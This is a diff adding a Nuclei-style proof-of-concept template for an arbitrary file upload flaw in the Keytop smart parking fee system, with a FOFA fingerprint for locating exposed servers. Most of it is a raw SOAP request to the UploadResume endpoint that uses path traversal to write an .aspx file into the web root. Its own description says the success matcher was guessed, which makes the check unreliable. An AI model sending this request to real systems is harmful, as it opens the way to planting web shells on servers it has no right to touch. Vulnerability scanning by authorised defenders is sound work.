@@ -1,0 +1,21 @@
+id: poc-nul9bs8pbxxhe07t
+info:
+  name: 科拓全智能停车视频收费系统存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nul9bs8pbxxhe07t
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nul9bs8pbxxhe07t
+    fofa: body="/KT_Css/qd_defaul.css"
+http:
+- raw:
+  - "POST /Webservice.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: 453\nSOAPAction: \"http://tempuri.org/UploadResume\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <UploadResume xmlns=\"http://tempuri.org/\">\n      <ip>1</ip>\n      <fileName>../../../../test1.aspx</fileName>\n      <fileFlow>MTIzMTIz</fileFlow>\n      <tag>3</tag>\n    </UploadResume>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
